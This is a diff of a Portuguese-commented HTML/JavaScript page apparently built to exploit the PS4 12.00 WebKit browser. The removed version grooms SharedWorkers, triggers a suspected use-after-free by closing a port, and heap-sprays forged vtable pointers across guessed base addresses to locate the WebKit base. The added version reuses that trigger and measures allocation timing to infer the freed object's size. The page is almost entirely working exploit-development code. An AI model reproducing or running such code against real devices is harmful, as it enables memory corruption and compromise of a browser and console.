@@ -2,148 +2,151 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 VTABLE ORACLE V2</title>
+    <title>PS4 12.00 MEMORY X-RAY</title>
+    
 </head>
 <body>
 
-    <h1>VTABLE ORACLE V2 (Precision Target)</h1>
-    <h3>VTable Offset: 0x82FBF8 | Target Size: 0xA0</h3>
-    <p>Selecione uma base. Se o console NÃO desligar, é a correta.</p>
+    <h1>MEMORY X-RAY (Timing Analysis)</h1>
+    <h3>Analisando comportamento do Free/Alloc no Worker 404</h3>
     
-    <div id="buttons"></div>
-    <div id="log">Pronto.</div>
+    <button onclick="startXray()">INICIAR RAIO-X</button>
+    
+    <div id="chart"></div>
+    <div id="log">Logs...</div>
 
     <script>
-        function log(msg, cls="") {
+        function log(msg) {
             var d = document.getElementById("log");
-            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            d.innerHTML += `<div>${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
-        // =================================================================
-        // DADOS CONFIRMADOS DO BINÁRIO
-        // =================================================================
-        // Candidato mais forte do seu scan:
-        const VTABLE_OFFSET = 0x82FBF8n; 
-        
-        // Tamanho mais provável (baseado em heurística anterior)
-        const TARGET_SIZE = 0xA0;       
-
-        // Bases para testar
-        const BASES = [
-            "0x800000000", "0x800004000", "0x801000000",
-            "0x800400000", "0x800800000", 
-            "0x820000000", "0x820004000", "0x820010000",
-            "0x880000000", "0x880004000",
-            "0x900000000", "0x920000000",
-            "0x200000000"
-        ];
-
-        // =================================================================
-        // PAYLOAD: RESTAURAR VTABLE
-        // =================================================================
-        function build_repair_payload(baseStr) {
-            const base = BigInt(baseStr);
-            const vtable_real = base + VTABLE_OFFSET;
-            
-            // Converte endereço para float
-            const buf = new ArrayBuffer(8);
-            const view = new DataView(buf);
-            view.setBigUint64(0, vtable_real, true);
-            const vtable_as_double = view.getFloat64(0, true);
-
-            // Tamanho 0xA0 (160 bytes)
-            // 160 - 16 (header) = 144 bytes dados
-            // 144 / 8 = 18 elementos
-            const arr = new Array(18);
-            
-            // Encher o objeto com o endereço da VTable VÁLIDA
-            for(let i=0; i<arr.length; i++) {
-                arr[i] = vtable_as_double;
-            }
-            return arr;
+        // Função de medição de alta precisão
+        function timeAlloc(size) {
+            var t0 = performance.now();
+            var arr = new ArrayBuffer(size);
+            var t1 = performance.now();
+            return { time: t1 - t0, obj: arr };
         }
 
-        // =================================================================
-        // EXECUÇÃO
-        // =================================================================
-        var workers_stash = [];
+        var workers = [];
+        var probes = [];
 
-        async function test_base(base) {
-            log(`>>> TESTANDO BASE: ${base} <<<`);
+        async function startXray() {
+            document.getElementById("chart").innerHTML = "";
+            log("1. Grooming (380)...");
             
-            var payload = build_repair_payload(base);
-
-            // 1. GROOMING (380)
+            // Enche a base
             for(let i=0; i<380; i++) {
-                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
+                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
             }
 
-            // 2. TRIGGER (403)
-            var count = 0;
-            var limit = 403 - 380;
+            // Chega perto do limite
+            log("2. Aproximando do 404...");
+            var p_count = 0;
             
             var it = setInterval(() => {
-                if(count >= limit) {
+                if (p_count >= 24) { // 380 + 24 = 404
                     clearInterval(it);
-                    
-                    log("!!! DISPARANDO !!!");
-                    var v = workers_stash.pop();
-                    var p = v.port;
-                    v.port.close();
-                    
-                    // SPRAY
-                    var spray = [];
-                    for(let k=0; k<25000; k++) {
-                        spray.push(payload.slice(0));
-                    }
-
-                    // CHECK DE SOBREVIVÊNCIA
-                    setTimeout(() => {
-                        try {
-                            var s = p.toString();
-                            
-                            log("RESULTADO: " + s, "success");
-                            
-                            if (s.indexOf("MessagePort") !== -1) {
-                                log("O objeto sobreviveu mas não foi substituído (Spray falhou).");
-                            } else {
-                                log("!!! OBJETO SUBSTITUÍDO E VIVO !!!", "success");
-                                log(`BASE ${base} É A CORRETA!`, "success");
-                                alert(`BINGO! Base WebKit: ${base}`);
-                            }
-                        } catch(e) {
-                            log("Erro JS (Isso é bom, não deu Panic): " + e);
-                        }
-                        
-                        // Limpeza
-                        workers_stash.forEach(w=>{try{w.port.close()}catch(e){}});
-                        workers_stash = [];
-                    }, 1000);
-
+                    performAnalysis();
                     return;
                 }
-                
                 try {
-                    let w = new SharedWorker("data:text,1", "v"+count);
+                    let w = new SharedWorker("data:text,1", "v"+p_count);
                     w.port.start();
-                    workers_stash.push(w);
+                    workers.push(w);
                 } catch(e){}
-                count++;
-            }, 100);
+                p_count++;
+            }, 50);
         }
 
-        // UI Setup
-        var div = document.getElementById("buttons");
-        BASES.forEach(base => {
-            var b = document.createElement("button");
-            b.innerText = base;
-            b.onclick = function() {
-                this.classList.add("tried");
-                test_base(base);
-            };
-            div.appendChild(b);
-        });
+        function performAnalysis() {
+            log("!!! ANALISANDO O MOMENTO DA MORTE (404) !!!");
+            
+            // Pega a vítima
+            var victim = workers.pop();
+            
+            // T0: Antes do Free
+            var t_pre = performance.now();
+            
+            // AÇÃO: FECHAR A PORTA (O suposto Free)
+            victim.port.close();
+            
+            // T1: Depois do Free
+            var t_post = performance.now();
+            log(`Tempo para .close(): ${(t_post - t_pre).toFixed(4)}ms`);
+
+            // AGORA: Tentar alocar 500 objetos de tamanhos variados e medir o tempo
+            // Se houver um buraco, uma dessas alocações será anormalmente rápida ou lenta.
+            
+            log("Escaneando Heap com micro-alocações...");
+            
+            var results = [];
+            // Testa tamanhos ao redor de 0xA0 (160)
+            var target_sizes = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0x100, 0x140];
+            
+            // Fazemos 100 rodadas de alocação rápida
+            for(let i=0; i<100; i++) {
+                for(let s of target_sizes) {
+                    let res = timeAlloc(s);
+                    results.push({ id: i, size: s, time: res.time });
+                    probes.push(res.obj); // Mantém vivo
+                }
+            }
+
+            // Desenhar Gráfico
+            drawChart(results);
+            analyzeResults(results);
+        }
+
+        function drawChart(data) {
+            var chart = document.getElementById("chart");
+            var maxTime = 0;
+            data.forEach(d => { if(d.time > maxTime) maxTime = d.time; });
+
+            data.forEach(d => {
+                var bar = document.createElement("div");
+                bar.className = "bar";
+                // Altura baseada no tempo (normalizado)
+                var h = (d.time / maxTime) * 100;
+                if(h < 5) h = 5; // Mínimo visível
+                bar.style.height = h + "%";
+                
+                // Cor baseada no tamanho
+                if (d.size === 0xA0) bar.style.backgroundColor = "red"; // Nosso alvo
+                else if (d.size === 0xC0) bar.style.backgroundColor = "yellow";
+                
+                bar.title = `Size: 0x${d.size.toString(16)}, Time: ${d.time.toFixed(3)}ms`;
+                chart.appendChild(bar);
+            });
+        }
+
+        function analyzeResults(data) {
+            // Procura anomalias (Spikes de tempo)
+            // Um tempo muito alto significa que o OS teve que trabalhar duro (Talvez GC ou Page Fault)
+            // Um tempo muito baixo logo depois significa que ele achou um buraco pronto.
+            
+            log("--- RESULTADOS ---");
+            
+            // Média
+            var sum = 0;
+            data.forEach(d => sum += d.time);
+            var avg = sum / data.length;
+            log(`Tempo médio de alocação: ${avg.toFixed(4)}ms`);
+
+            // Acha picos
+            var spikes = data.filter(d => d.time > avg * 5); // 5x mais lento que a média
+            if (spikes.length > 0) {
+                log(`DETECTADOS ${spikes.length} PICOS DE LATÊNCIA!`);
+                spikes.forEach(s => {
+                    log(`-> Pico no tamanho 0x${s.size.toString(16)}: ${s.time.toFixed(3)}ms`);
+                });
+                log("DICA: O tamanho onde ocorre o pico (ou logo após ele) é o tamanho real do buraco.");
+            } else {
+                log("Nenhuma anomalia temporal detectada. O Free pode ter sido adiado (Lazy GC).");
+            }
+        }
     </script>
 </body>
 </html>
